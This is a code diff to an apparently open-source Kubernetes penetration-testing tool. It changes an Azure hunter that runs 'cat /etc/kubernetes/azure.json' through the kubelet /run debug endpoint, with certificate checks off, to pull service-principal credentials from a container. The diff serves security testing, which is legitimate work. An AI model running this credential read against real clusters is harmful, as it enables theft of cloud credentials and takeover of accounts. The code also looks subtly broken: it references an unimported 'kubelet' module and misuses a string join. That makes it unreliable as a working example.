@@ -3,7 +3,7 @@ import logging
 import requests
 
 from kube_hunter.conf import get_config
-from kube_hunter.modules.hunting.kubelet import ExposedRunHandler
+from kube_hunter.modules.hunting.kubelet import ExposedPodsHandler, SecureKubeletPortHunter
 from kube_hunter.core.events import handler
 from kube_hunter.core.events.types import Event, Vulnerability
 from kube_hunter.core.types import Hunter, ActiveHunter, IdentityTheft, Azure
@@ -25,7 +25,7 @@ class AzureSpnExposure(Vulnerability, Event):
         self.container = container
 
 
-@handler.subscribe(ExposedRunHandler, predicate=lambda x: x.cloud == "Azure")
+@handler.subscribe(ExposedPodsHandler, predicate=lambda x: x.cloud == "Azure")
 class AzureSpnHunter(Hunter):
     """AKS Hunting
     Hunting Azure cluster deployments using specific known configurations
@@ -78,12 +78,24 @@ class ProveAzureSpnExposure(ActiveHunter):
         self.event = event
         self.base_url = f"https://{self.event.host}:{self.event.port}"
 
+    def test_run_capability(self):
+        """
+        Uses SecureKubeletPortHunter to test the /run handler
+        TODO: when multiple event subscription is implemented, use this here to make sure /run is accessible
+        """
+        debug_handlers = kubelet.SecureKubeletPortHunter.DebugHandlers(path=self.base_url, session=self.event.session)
+        return debug_handlers.test_run_container()
+
     def run(self, command, container):
         config = get_config()
         run_url = "/".join(self.base_url, "run", container["namespace"], container["pod"], container["name"])
         return requests.post(run_url, verify=False, params={"cmd": command}, timeout=config.network_timeout)
 
     def execute(self):
+        if not self.test_run_capability():
+            logger.debug("Not proving AzureSpnExposure because /run debug handler is disabled")
+            return
+
         try:
             subscription = self.run("cat /etc/kubernetes/azure.json", container=self.event.container).json()
         except requests.Timeout:
